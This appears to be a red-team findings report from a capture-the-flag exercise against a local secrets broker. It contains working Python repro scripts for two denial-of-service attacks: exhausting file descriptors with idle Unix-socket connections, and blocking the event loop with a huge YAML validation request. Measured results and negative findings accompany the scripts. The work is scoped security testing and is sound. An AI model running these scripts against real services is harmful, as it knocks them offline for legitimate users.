candidates.title: fd-exhaustion DoS: ~1020 idle connections from one non-root listed user pin the broker to its RLIMIT_NOFILE=1024 ceiling; broker can no longer accept/service any client while held
repro_cmds: # holder (background): opens as many idle sockets as its own fd limit allows, holds, releases.

cat > /tmp/w1_fd_holder.py <<'PY'
import socket, sys, time, resource
SOCK='/run/envh-ctf/ctl.sock'
HOLD=float(sys.argv[1]) if len(sys.argv)>1 else 10.0
soft,_=resource.getrlimit(resource.RLIMIT_NOFILE)
holders=[]; refused=0
for i in range(soft-4):
    try: s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
    except OSError: break
    try: s.connect(SOCK)
    except OSError:
        refused+=1; s.close()
        if refused>30: break
        continue
    holders.append(s)
print(f'READY opened={len(holders)} self_soft={soft} refusals={refused}',flush=True)
time.sleep(HOLD)
for s in holders: s.close()
print('RELEASED',flush=True)
PY
until grep -q READY /tmp/w1_fd_holder.out; do sleep 0.1; done; cat /tmp/w1_fd_holder.out
wait; sleep 1.3; sudo -u redteam /opt/ctf/venv/bin/python /tmp/w1_fd_probe.py recovered 3   # expect reply ok=True (recovered)

holder: READY opened=1020 self_soft=1024 refusals=0 in 0.04s
(broker /proc fd count at this moment = 1024, its RLIMIT_NOFILE soft ceiling)
PROBE[exhausted-1] TIMEOUT after 3.003s  <-- broker could NOT service (fd-exhausted)
PROBE[exhausted-2] TIMEOUT after 3.003s  <-- broker could NOT service (fd-exhausted)

candidates.why_novel: README/SECURITY.md say nothing about availability, DoS, connection limits, or file-descriptor exhaustion (grep for denial|dos|connection|fd|rlimit|nofile|resource|exhaust|flood|concurrent|wedge in README.md+SECURITY.md returns no relevant hit). CHARTER section 4 explicitly lists 'exhausting it' as a valid DoS win. Root cause is in scope (socket protocol): ControlServer never raises RLIMIT_NOFILE (server/hardening.py harden_process only sets RLIMIT_CORE=0; the CTF launcher doesn't raise it either), there is no cap on concurrent accepted connections and no per-uid connection limit, and Connection.serve() blocks in `await self.reader.readline()` with NO idle timeout after the uid check passes, so a listed user can hold every connection open for free (no pending-request slot consumed, so MAX_PENDING_PER_USER=20 does not bound it).
candidates.notes: Reproduced entirely as non-root `redteam`. One process opens ~1020 idle connections (sends nothing); the per-connection handler blocks forever in readline(), pinning one broker fd each; broker reaches its 1024 fd ceiling and asyncio's accept loop EMFILE-stalls (retries every ACCEPT_RETRY_DELAY=1s), so fresh clients connect() into the listen backlog but are never accepted -> they time out / hang. Fully recoverable the instant the attacker's connections close, but the attacker can hold them indefinitely at zero cost, making it a sustained availability DoS. Requires being a LISTED user: an unlisted `outsider` connection is accepted-then-rejected at the uid check and closed within ms, so it cannot HOLD fds (note: accept still happens before the uid check, so a high-rate outsider connect flood causes transient churn, but not a stable hold). The broker was returned to full health after each test (verified: fd count back to 8, `list` replies in ~0.009s).

candidates.title: Event-loop wedge: a single op_preset_validate with an ~800KB YAML blocks the broker's single-threaded asyncio loop for ~6s (no approval needed); repeat to freeze the whole broker + console indefinitely
repro_cmds:
cat > /tmp/w1_loopblock.py <<'PY'
import socket, threading, time, json
SOCK='/run/envh-ctf/ctl.sock'
N=400000
yaml_text='presets: ['+','.join('x' for _ in range(N))+']\n'
line=json.dumps({'op':'preset_validate','yaml':yaml_text}).encode()+b'\n'
print(f'heavy line size = {len(line)} bytes (MAX_LINE=1048576)')
res={}
def heavy():
    s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect(SOCK); t=time.time()
    s.sendall(line); f=s.makefile('rb'); r=f.readline()
    res['dt']=time.time()-t; res['reply']=r.decode('utf-8','replace')[:120]; s.close()
def list_latency():
    s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(30); s.connect(SOCK); t=time.time()
    s.sendall(b'{"op":"list"}\n'); s.makefile('rb').readline(); dt=time.time()-t; s.close(); return dt
print(f'baseline list latency (idle): {list_latency():.3f}s')
th=threading.Thread(target=heavy); th.start(); time.sleep(0.3)
print(f'list latency DURING heavy preset_validate: {list_latency():.3f}s  <-- blocked time')
th.join(); print(f'heavy preset_validate took {res["dt"]:.3f}s; reply: {res["reply"]}')
PY

baseline list latency (idle loop): 0.001s
list latency DURING heavy preset_validate: 5.727s  <-- blocked time
heavy preset_validate took 6.027s; reply: {"ok": false, "error": "presets.yaml: presets: expected a mapping, got list"}
candidates.why_novel: Not acknowledged anywhere in README/SECURITY.md. CHARTER section 4 explicitly lists 'wedging its event loop' and 'slow/huge YAML' (F9) as valid. Root cause in scope: server/control.py op_preset_validate calls broker.validate_preset_yaml -> core/config.parse_presets -> yaml.safe_load(text) SYNCHRONOUSLY on the event-loop thread (no run_in_executor, no await), and op_preset_validate requires NO console approval (it validates and returns immediately). yaml.safe_load of ~1MB of text is O(seconds) of pure-Python CPU, during which the single-threaded broker cannot service any other client, the console, or the sweeper. The expensive safe_load runs BEFORE any structure validation, so even malformed/invalid-preset YAML triggers the full block.
candidates.notes: Measured locally: ~1MB YAML safe_load ~3.3s; an 800KB flow sequence ~3.3s; the live-broker test showed a concurrent trivial `list` delayed from 0.001s to 5.727s by ONE call. Each call costs the attacker one <1MB line and freezes the ENTIRE broker (including the human console) for several seconds; firing them back-to-back (or concurrently) sustains the wedge indefinitely. op_preset_propose and op_import reach the same synchronous yaml.safe_load / dump_presets / difflib path and are alternative vectors, but op_preset_validate is the cleanest (no pending request created, no approval, immediate). Distinct from candidate-1 (that is fd exhaustion; this is CPU/loop starvation). No secret value is leaked by this path.

negative_results: YAML 'billion laughs' / nested-alias bomb via op_preset_validate does NOT work: PyYAML safe_load shares references on alias expansion (builds a DAG, not a tree), so a 6-8 level, fan-8/10 alias bomb (input ~300 bytes, nominal ~16M-387M nodes) loads in 0.001s with O(levels*fan) real objects. No broker path tree-expands it either: parse_presets only inspects document['presets'] and rejects unknown top-level keys immediately; dump_presets (yaml.safe_dump) and copy.deepcopy (renamed_presets) both track objects by id and preserve sharing, so they don't blow up. Use the plain large-YAML CPU block (candidate-2) instead.

Type confusion in handler arg coercion is caught, not fatal: `{"op":"session_start","minutes":[1,2],...}` (int([..]) TypeError), `{"op":"session_start","with":5}` (iterate int), `{"op":"session_wait","request_id":{...}}` (int(dict)), `{"op":"run","session":{...},"with":5}`, and `{"op":"session_start","minutes":1e20...}` (timedelta OverflowError) all return {"ok":false,"error":"internal error in the broker; see its console"} and the broker stays fully up. These are unhandled-exception robustness gaps (TypeError/OverflowError escape HandledErrors and hit the generic except Exception in ControlServer._handle), but there is NO crash and NO secret leak -> no security impact on their own. Each does write one audit.event('error', traceback=...) line (see out_of_scope note).

Oversized line (> MAX_LINE = 1MB, no newline): readline() raises ValueError, caught by the generic handler -> {"ok":false,"error":"internal error..."}, connection closed, broker healthy afterward. Handled; not a DoS.

op_* handler discovery via getattr(self, 'op_'+op) is safely scoped: op='' , op='_mapping', op='send', op='__init__' etc. all resolve to no op_-prefixed attribute -> 'unknown operation'. No way to reach private/non-handler methods, no method injection.

Only one operation is processed per connection: sending `{"op":"list"}\n{"op":"status"}\n` on one socket yields exactly one reply (list) then EOF; serve() reads a single line then returns and the writer is closed. (run_done / decision follow-ups are read within the SAME op's protocol, never dispatched as new ops.)

Extra/unknown JSON fields are ignored (e.g. list with garbage/op2/bad-typed minutes still returns the normal list). Unknown top-level JSON shapes (list, int op, non-dict) -> clean 'malformed request' RequestError. Malformed JSON -> clean 'malformed request: <json error>'.

No secret VALUE is surfaced by any F1 op: op_list / op_status return only secret names, approval, max_session, description, fingerprints-not-included; op_preset_validate echoes only the proposed preset NAMES (sorted(raw)); op_preset_propose / op_import reply with the result only on 'approved' (never happens, no approver) and otherwise only {pending:true}; error strings never contain vault values. The CTF flag CTF-FLAG-<hex> was never obtained via the socket protocol.

Regex ReDoS: SECRET_NAME ^[A-Z][A-Z0-9_]*$, VAR_NAME ^[A-Za-z_][A-Za-z0-9_]*$, PRESET_NAME ^[a-z0-9][a-z0-9._-]*$, PLAIN_SCALAR ^[A-Za-z0-9_.-]+$, durations ^(\d+)([smh])$, and common._UNSAFE_CHARACTERS (a single char class) are all linear with no nested quantifiers/ambiguous alternation -> no catastrophic backtracking. Not a DoS lever.

MAX_PENDING_PER_USER=20 bounds pending requests per uid, and it is per-uid, so redteam cannot fill another user's pending queue; a silent session_start request waits forever (abandon_at stays None until the client disconnects, so the sweeper never withdraws it) but this only self-limits redteam's own 20 slots -> self-DoS only, no cross-user or broker-wide effect.

Unlisted user `outsider` (uid 30034) is rejected cleanly at the uid check ('uid 30034 is not in the broker's users list...') and its connection is closed immediately, so outsider cannot HOLD connections for the fd-exhaustion hold (candidate-1 requires a listed user).
out_of_scope_observations: The broker process's RLIMIT_NOFILE (soft 1024 / hard 20000) and live fd count were read from /proc/<pid>/limits and /proc/<pid>/fd as root purely to CHARACTERIZE candidate-1; this reading is not part of the attack and was not used to obtain any secret. The attack itself (candidate-1) is fully demonstrated and reproducible as non-root redteam without any /proc access. (Reading the broker's /proc mem/environ/cmdline remains out of scope per CHARTER section 3 and was NOT done.)

The type-confusion 'internal error' paths each emit an audit.event('error', where='control', detail=traceback) line into the audit log (/var/lib/envh-ctf/audit.jsonl, 0600 envhsvc). In principle spamming them could grow that file toward a disk-fill DoS, but (a) verifying the growth requires reading the 0600 audit file (out of scope) and (b) it is far slower/weaker than candidates 1 and 2, so it is noted only, not claimed.

Vault/age operations, secret VALUES, and the flag live only in broker memory; no socket path exposes them without an approval and there is no approver, so FLAG EXFIL via F1 is structurally absent. Any memory-reading route (ptrace/gcore//proc/<pid>/mem) is out of scope and was not attempted.
